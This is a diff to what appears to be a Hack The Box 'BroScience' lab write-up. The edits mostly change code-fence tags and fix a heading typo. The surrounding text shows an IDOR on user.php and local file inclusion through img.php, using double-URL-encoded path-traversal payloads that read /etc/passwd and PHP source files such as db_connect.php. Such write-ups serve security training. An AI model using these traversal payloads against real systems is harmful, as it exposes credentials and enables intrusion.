@@ -105,7 +105,7 @@ While browsing the page we were able to identify an IDOR that exposes
 - IS Activated
 - IS Admin
 
-```http
+```url
 # Just change the ID
 https://broscience.htb/user.php?id=1
 ```
@@ -122,14 +122,14 @@ Error: Missing 'path' parameter.
 Basic **LFI** will fail and tell us **Error: Attack detected.**  
 We have to double URL Encode it so that it will work  
 
-```http
+```url
 # Failing
 https://broscience.htb/includes/img.php?path=../../../../etc/passwd
 ```
 
 #### /etc/passwd
 
-```http
+```url
 https://broscience.htb/includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
 ```
 
@@ -140,7 +140,7 @@ postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 ```
 
 #### /var/www/html/includes/db_connect.php
-```html
+```url
 https://broscience.htb/includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%36%34%25%36%32%25%35%66%25%36%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%32%65%25%37%30%25%36%38%25%37%30
 ```
 
@@ -165,7 +165,7 @@ if (!$db_conn) {
 
 Seems to be the script that generates activation codes and is used to update a cookie called **user-prefs**. Since **user-prefs** uses serialization this could be an attack vector during our next steps. 
 
-```http
+```url
 https://broscience.htb/includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%37%35%25%37%34%25%36%39%25%36%63%25%37%33%25%32%65%25%37%30%25%36%38%25%37%30
 ```
 
@@ -187,7 +187,7 @@ function generate_activation_code() {
 
 Used to activate a freshly registered user account
 
-```http
+```url
 https://broscience.htb/%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%31%25%36%33%25%37%34%25%36%39%25%37%36%25%36%31%25%37%34%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30
 ```
 
@@ -225,7 +225,7 @@ if (isset($_GET['code'])) {
 }
 ```
 
-# Explotation
+# Exploitation
 
 ## User activation
 
